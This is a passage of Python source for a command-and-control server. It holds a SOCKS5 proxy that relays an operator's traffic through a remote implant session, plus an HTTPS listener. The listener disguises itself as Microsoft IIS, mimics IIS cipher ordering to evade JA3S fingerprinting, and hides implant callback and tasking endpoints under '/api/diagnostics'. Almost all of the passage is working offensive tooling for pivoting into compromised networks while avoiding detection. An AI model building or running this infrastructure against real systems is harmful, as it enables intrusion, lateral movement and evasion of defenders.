            conn.recv(nmethods)
            conn.sendall(b"\x05\x00")  # no auth

            # --- SOCKS5 request ---
            req = conn.recv(4)
            if len(req) < 4 or req[0] != 5 or req[1] != 1:  # only CONNECT
                conn.sendall(b"\x05\x07\x00\x01" + b"\x00"*6)
                return
            atype = req[3]
            if atype == 1:    # IPv4
                raw = conn.recv(4)
                host = ".".join(str(b) for b in raw)
            elif atype == 3:  # domain
                ln = conn.recv(1)[0]
                host = conn.recv(ln).decode("utf-8", errors="replace")
            elif atype == 4:  # IPv6
                raw = conn.recv(16)
                host = _socket.inet_ntop(_socket.AF_INET6, raw)
            else:
                conn.sendall(b"\x05\x08\x00\x01" + b"\x00"*6)
                return
            port_raw = conn.recv(2)
            port = _struct.unpack("!H", port_raw)[0]

            # --- Ask agent to connect ---
            result = _c2_task_sync(sid, f"tcpconn {host} {port}", timeout=10.0)
            if not result or "connected id=" not in result:
                conn.sendall(b"\x05\x04\x00\x01" + b"\x00"*6)
                return
            relay_id = result.split("id=")[1].strip()
            conn.sendall(b"\x05\x00\x00\x01" + b"\x00"*6)

            # --- Relay loop ---
            conn.settimeout(0.5)
            while True:
                # Receive from SOCKS5 client (attacker tool)
                try:
                    data = conn.recv(32768)
                except _socket.timeout:
                    data = b""
                except Exception:
                    break

                import base64 as _b64
                b64_data = _b64.b64encode(data).decode() if data else ""
                # Send to agent + receive response
                resp = _c2_task_sync(sid, f"tcpsend {relay_id} {b64_data}", timeout=5.0)
                if resp is None:
                    break  # agent dead or timeout
                if resp.strip():
                    try:
                        decoded = _b64.b64decode(resp.strip())
                        if decoded:
                            conn.sendall(decoded)
                    except Exception:
                        pass
                elif not data:
                    # Nothing from client or agent — idle poll to detect close
                    time.sleep(0.1)
                    continue

        except Exception:
            pass
        finally:
            try:
                _c2_task_sync(sid, f"tcpclose {relay_id if 'relay_id' in dir() else '0'}", timeout=3.0)
            except Exception:
                pass


def socks5_start(session_id: str, port: int) -> dict:
    """Start a SOCKS5 proxy on 127.0.0.1:<port> routing through session_id."""
    with _SOCKS5_LOCK:
        if session_id in _ACTIVE_SOCKS5:
            return {"error": "already running", "port": _ACTIVE_SOCKS5[session_id]["port"]}
        if session_id not in _C2_SESSIONS:
            return {"error": "session not found"}

    # Bind before spawning thread so we can report port-in-use immediately
    try:
        class _Srv(socketserver.ThreadingTCPServer):
            allow_reuse_address = True
            daemon_threads      = True
            def finish_request(self, request, client_address):
                handler = _Socks5Handler(request, client_address, self)
                handler.session_id = _Socks5Handler.session_id
        _Socks5Handler.session_id = session_id
        srv = _Srv(("127.0.0.1", port), _Socks5Handler)
    except OSError as e:
        return {"error": str(e)}

    def _run():
        srv.serve_forever()

    t = threading.Thread(target=_run, daemon=True, name=f"socks5-{session_id[:8]}")
    t.start()
    with _SOCKS5_LOCK:
        _ACTIVE_SOCKS5[session_id] = {"thread": t, "server": srv, "port": port}
    return {"ok": True, "port": port, "session": session_id}


def socks5_stop(session_id: str) -> dict:
    with _SOCKS5_LOCK:
        entry = _ACTIVE_SOCKS5.pop(session_id, None)
    if not entry:
        return {"error": "not running"}
    entry["server"].shutdown()
    return {"ok": True}


def socks5_status() -> dict:
    with _SOCKS5_LOCK:
        return {sid: {"port": e["port"]} for sid, e in _ACTIVE_SOCKS5.items()}


def start_server(
    workspace:       str,
    lhost:           str = "0.0.0.0",
    port:            int = 8443,
    mgmt_port:       int = 8444,
    cert:            str = None,
    key:             str = None,
    callback_prefix: str = "/api/diagnostics",
    callback_host:   str = "",
):
    if cert is None or key is None:
        cert, key = ensure_certs(workspace, lhost)
    if not cert:
        print("[!] TLS cert generation failed — cannot start server")
        return

    global _SERVER_BASE
    _Handler.workspace       = workspace
    _Handler.callback_prefix = callback_prefix
    _set_ui_workspace(workspace)
    _cb_host = callback_host or (lhost if lhost not in ("", "0.0.0.0") else "localhost")
    _SERVER_BASE = f"https://{_cb_host}:{port}"

    class _ThreadedHTTPS(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        allow_reuse_address = True

    class _ThreadedHTTP(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        allow_reuse_address = True

    httpd = _ThreadedHTTPS((lhost, port), _Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.set_ciphers(_IIS_CIPHERS)
    ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | getattr(ssl, "OP_NO_TICKET", 0)
    ctx.load_cert_chain(certfile=cert, keyfile=key)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    # Background cleanup: reap dead sessions and orphaned results
    def _cleanup_loop():
        while True:
            time.sleep(60)
            cutoff_session = datetime.now() - timedelta(seconds=600)
            cutoff_result  = datetime.now() - timedelta(seconds=300)
            with _C2_LOCK:
                dead = [sid for sid, s in _C2_SESSIONS.items()
                        if s["last_seen"] < cutoff_session]
                for sid in dead:
                    del _C2_SESSIONS[sid]
                for sid, s in _C2_SESSIONS.items():
                    stale_tasks = [tid for tid, (ts, _) in s["results"].items()
                                   if ts < cutoff_result]
                    for tid in stale_tasks:
                        del s["results"][tid]

    threading.Thread(target=_cleanup_loop, daemon=True).start()

    # Management API on loopback (plain HTTP, no TLS — localhost only)
    mgmt = _ThreadedHTTP(("127.0.0.1", mgmt_port), _MgmtHandler)
    mgmt_thread = threading.Thread(target=mgmt.serve_forever, daemon=True)
    mgmt_thread.start()

    print(f"[+] HTTPS server  {lhost}:{port}")
    print(f"    Workspace : {workspace}")
    print(f"    Cert      : {cert}")
    print(f"    Callbacks : POST {callback_prefix}/.../<token>")
    print(f"    C2 poll   : GET  {callback_prefix}/<session>/task")
    print(f"    C2 reg    : POST {callback_prefix}/c2/register")
    print(f"    Mgmt API  : http://127.0.0.1:{mgmt_port}/mgmt/...")
    print(f"    Headers   : Server: Microsoft-IIS/10.0")
    print(f"    Ciphers   : IIS/Schannel order (JA3S mimicry)")
    print(f"    UI        : https://{lhost}:{port}/ui/")
    print(f"    Ctrl+C to stop\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        mgmt.shutdown()
